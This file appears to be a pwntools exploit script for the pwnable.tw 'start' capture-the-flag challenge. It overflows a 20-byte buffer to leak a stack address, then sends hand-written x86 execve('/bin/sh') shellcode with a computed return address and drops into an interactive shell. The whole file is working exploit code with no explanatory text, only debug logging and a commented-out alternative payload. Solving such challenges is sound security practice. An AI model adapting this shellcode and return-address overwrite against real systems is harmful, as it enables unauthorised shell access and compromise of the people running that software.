from pwn import *

r = process('./start')
# r = remote('chall.pwnable.tw', 10000)

r.recv(20)

payload = asm('''
    mov al, 0xb
    xor ecx,ecx
    xor edx,edx
    push 0x0068732f
    push 0x6e69622f
    mov ebx, esp
    int 0x80
''')
# payload = asm('''
#     xor eax,eax
#     push eax
#     push 0x0068732f
#     push 0x6e69622f
#     mov ebx, esp
#     xor ecx,ecx
#     xor edx,edx
#     mov al, 0xb
#     int 0x80
# ''')
log.info('Payload = {}'.format((payload).hex()))
raw_input()
r.sendline(b'a'*20 + p32(0x8048087))
# raw_input()
# for i in range(5):
#     idx = r.recv(4)[::-1].hex()
#     log.info(f'idx = {idx}')
idx = r.recv(4)[::-1].hex()
log.info(f'idx = {idx}')
r.recv(16)
return_addr = int(idx, 16) + 0x32
log.info(f'return addr = {hex(return_addr)}')
r.sendline(payload + p32(return_addr))# + b"\x00"*4

r.interactive()


#0xffffcc3c-0xffffcc1e
#0xffffcc3c